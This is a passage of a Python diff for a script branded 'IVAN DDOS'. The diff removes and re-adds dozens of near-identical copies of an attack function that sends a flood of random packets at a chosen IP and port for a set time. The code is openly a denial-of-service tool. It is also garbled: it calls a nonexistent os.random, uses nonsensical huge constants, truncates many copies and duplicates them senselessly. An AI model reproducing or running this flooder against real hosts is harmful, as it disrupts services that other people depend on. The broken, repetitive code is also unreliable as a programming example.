-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -7505,7 +6877,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -7531,33 +6903,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -7583,7 +6929,661 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
